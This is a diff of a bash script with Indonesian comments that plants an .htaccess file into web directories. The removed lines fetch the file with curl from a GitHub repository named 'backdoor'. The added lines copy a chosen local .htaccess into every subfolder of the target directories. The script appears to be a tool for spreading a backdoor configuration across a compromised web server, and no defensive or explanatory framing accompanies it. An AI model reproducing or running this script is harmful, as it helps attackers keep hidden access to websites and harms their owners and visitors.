@@ -1,24 +1,28 @@
 #!/bin/bash
 
-# URL RAW GitHub yang berisi .htaccess
-HTACCESS_URL="https://raw.githubusercontent.com/letsr00t/backdoor/refs/heads/main/phar"
+# Minta input nama file .htaccess lokal
+read -p "Masukkan path file .htaccess yang akan digunakan: " HTACCESS_FILE
 
-# Minta input dari user
-read -p "Masukkan directory yang mau di-htaccess (pisahkan dengan spasi): " -a TARGET_DIRS
+# Cek apakah file ada
+if [[ ! -f "$HTACCESS_FILE" ]]; then
+  echo "[!] File tidak ditemukan: $HTACCESS_FILE"
+  exit 1
+fi
 
-# Loop tiap folder yang diinput
-for dir in "${TARGET_DIRS[@]}"; do
-  if [[ -d "$dir" ]]; then
-    echo "[*] Menyimpan .htaccess ke: $dir"
+# Minta input direktori target
+read -p "Masukkan daftar direktori utama (pisahkan dengan spasi): " -a TARGET_DIRS
 
-    curl -sSL "$HTACCESS_URL" -o "${dir}/.htaccess"
+# Loop semua direktori
+for base in "${TARGET_DIRS[@]}"; do
+  if [[ -d "$base" ]]; then
+    echo "[*] Menyebar .htaccess ke semua subfolder dalam: $base"
 
-    if [[ -f "${dir}/.htaccess" ]]; then
-      echo "[✓] Sukses: ${dir}/.htaccess"
-    else
-      echo "[x] Gagal menyimpan: ${dir}/.htaccess"
-    fi
+    # Temukan semua folder termasuk dirinya sendiri
+    find "$base" -type d | while read subdir; do
+      cp "$HTACCESS_FILE" "$subdir/.htaccess"
+      echo "  └─ Ditulis ke: $subdir/.htaccess"
+    done
   else
-    echo "[!] Folder tidak ditemukan: $dir"
+    echo "[!] Direktori tidak ditemukan: $base"
   fi
 done
